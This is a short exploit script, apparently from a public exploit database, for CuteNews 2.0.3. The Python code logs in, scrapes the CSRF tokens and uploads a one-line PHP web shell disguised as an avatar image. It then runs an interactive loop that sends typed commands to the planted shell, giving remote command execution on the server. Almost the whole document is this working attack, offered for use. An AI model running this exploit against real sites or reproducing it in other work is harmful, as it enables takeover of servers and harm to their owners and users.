# Exploit Title   : CUTENEWS 2.0.3
# Date            : 28 June 2019
# Exploit Author  : Doctor_Hacker
# Version         : 2.0.3 
# Tested on       : Windows

import requests
from bs4 import BeautifulSoup

#You must register a user e.g. hacker/hacklab before running this.

#Define IP and port.
IP='127.0.0.1'
port=80
username='hacklab'
password='hacklab'

#Build URL String
url='http://'+IP+':'+str(port)+'/index.php'

#Get session headers
my_session = requests.Session() 
r = my_session.get(url)

#Set all POST variables.
payload = {'action': 'dologin', 'username': username, 'password': password}

#Now do the POST.
r = my_session.post(url, data=payload)

#Should be logged in okay now.

#Get Page and extract keys. - 
url=url+'?mod=main&opt=personal'
r = my_session.get(url)

#String handling - must extract CSRF token.
#E.g.  <input type="hidden" name="mod" value="main" /><input type="hidden" name="opt" value="personal" /><input type="hidden" name="__signature_key" value="6e49f985c8b6daff45de5325f420975e-test" /><input type="hidden" name="__signature_dsi" value="1c01ecc971a182251f520577e74ef901" />
soup = BeautifulSoup(r.content, "html.parser")
sigkey = soup.findAll("input", {"type": "hidden", "name": "__signature_key"})
sigkey= (sigkey[0]['value'])
soup = BeautifulSoup(r.content, "html.parser")
dsi = soup.findAll("input", {"type": "hidden", "name": "__signature_dsi"})
dsi= (dsi[0]['value'])


#Build shell file to upload.
text_file=open ("shell.php","w")
text_file.write ('<?PHP system($_GET["cmd"]); ?>'+'\n')
text_file.close()

#Define file to upload for the POST
myfile = {'avatar_file': open('shell.php' ,'rb')}
#Set all POST variables.
payload = {
'mod': 'main', 'opt': 'personal', 'editpassword': '', 'confirmpassword': '', 'editnickname':username, 'more[site]': '',  'more[about]': '', '__signature_key': sigkey,  '__signature_dsi': dsi }


#Now do the POST.
x = my_session.post(url, files = myfile, data=payload)
print (x.text)

while True:
	#Get the command
	print ("Type exit to get out of here.")
	cmd = input('shell@'+IP+':~# ')

	if cmd.strip() == 'exit':
		break

	#Build URL String
	url='http://'+IP+':'+str(port)+'/uploads/avatar_'+username+'_shell.php?cmd='+cmd

	#Run the SHELL.
	r = my_session.get(url)
	print(r.text)
